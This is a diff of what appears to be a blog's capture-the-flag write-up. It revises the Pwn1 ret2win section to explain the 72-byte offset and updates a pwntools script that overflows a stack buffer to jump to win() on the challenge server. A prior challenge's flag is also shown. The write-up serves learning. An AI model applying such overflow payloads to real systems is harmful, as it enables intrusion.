@@ -297,12 +297,12 @@ I managed to solve a variety of challenges from various categories.</p>
 <p>n00bz{5h0p_g0t_h3ck3d_4nd_fl4g_g0t_570l3n!}</p>
 
 <h5>Pwn1</h5>
-<p>This challenge provided a ELF file. It was using netcat. After analyzing the ELF file, I found that it was a ret2win chall. I found the addresses of the return and the win() function from Ghidra and wrote the following script.</p>
+<p>This challenge provided a ELF file. It was using netcat. After analyzing the ELF file, I found that it was a ret2win chall. So if you know you can overflow in a stack buffer of size x and there are no other locals, the offset to the return address is x+8. Here the array size was 64. So the offset should be 72 chars long. I found the address of the win() function from Ghidra and wrote the following script.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
 <span class="line"><span class="kn">from</span> <span class="n">pwn</span> <span class="k">import</span> <span class="o">*</span></span>
 <span class="line"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">"challs.n00bzunit3d.xyz"</span><span class="p">,</span> <span class="mi">35932</span><span class="p">)</span></span>
 <span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span></span>
-<span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="nb">b'A'</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0x00401249</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0x0040124a</span><span class="p">)</span></span>
+<span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="nb">b'A'</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0x0040124a</span><span class="p">)</span></span>
 <span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
 <span class="line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
 <span class="line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
